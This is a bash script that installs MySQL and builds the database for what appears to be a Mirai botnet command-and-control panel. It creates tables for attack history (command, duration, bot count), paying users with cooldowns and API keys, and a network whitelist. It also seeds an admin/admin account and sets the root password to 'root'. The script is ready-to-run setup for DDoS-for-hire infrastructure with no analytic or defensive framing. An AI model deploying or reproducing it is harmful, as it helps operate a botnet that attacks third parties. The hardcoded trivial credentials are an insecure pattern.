#!/bin/bash

# Install MySQL server and client
if ! dpkg -l | grep -q mysql-server; then
    echo "MySQL server is not installed. Installing now..."
    sudo apt-get update
    sudo apt-get install mysql-server mysql-client -y
else
    echo "MySQL server and client are already installed."
fi

# Start MySQL service (if it's not already started)
sudo systemctl start mysql

# Log in to MySQL and create the database and tables using the root password in the script
echo "Setting up the database and tables..."
sudo mysql -u root -proot <<EOF
CREATE DATABASE IF NOT EXISTS mirai;

USE mirai;

CREATE TABLE IF NOT EXISTS history (
  id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  user_id INT(10) UNSIGNED NOT NULL,
  time_sent INT(10) UNSIGNED NOT NULL,
  duration INT(10) UNSIGNED NOT NULL,
  command TEXT NOT NULL,
  max_bots INT(11) DEFAULT '-1',
  PRIMARY KEY (id),
  KEY user_id (user_id)
);

CREATE TABLE IF NOT EXISTS users (
  id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  username VARCHAR(32) NOT NULL,
  password VARCHAR(32) NOT NULL,
  duration_limit INT(10) UNSIGNED DEFAULT NULL,
  cooldown INT(10) UNSIGNED NOT NULL,
  wrc INT(10) UNSIGNED DEFAULT NULL,
  last_paid INT(10) UNSIGNED NOT NULL,
  max_bots INT(11) DEFAULT '-1',
  admin INT(10) UNSIGNED DEFAULT '0',
  intvl INT(10) UNSIGNED DEFAULT '30',
  api_key TEXT,
  PRIMARY KEY (id),
  KEY username (username)
);

CREATE TABLE IF NOT EXISTS whitelist (
  id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  prefix VARCHAR(16) DEFAULT NULL,
  netmask TINYINT(3) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (id),
  KEY prefix (prefix)
);

-- Insert the default admin user
INSERT INTO users (id, username, password, duration_limit, cooldown, wrc, last_paid, max_bots, admin, intvl, api_key) 
VALUES (NULL, 'admin', 'admin', 0, 0, 0, 0, -1, 1, 30, '');
EOF

# Restart MySQL service
echo "Restarting MySQL service..."
sudo service mysql restart

# Change root password and flush privileges
echo "Setting root user password to 'root' using mysql_native_password..."
sudo mysql -u root -proot <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';
FLUSH PRIVILEGES;
EOF

echo "MySQL setup is complete!"
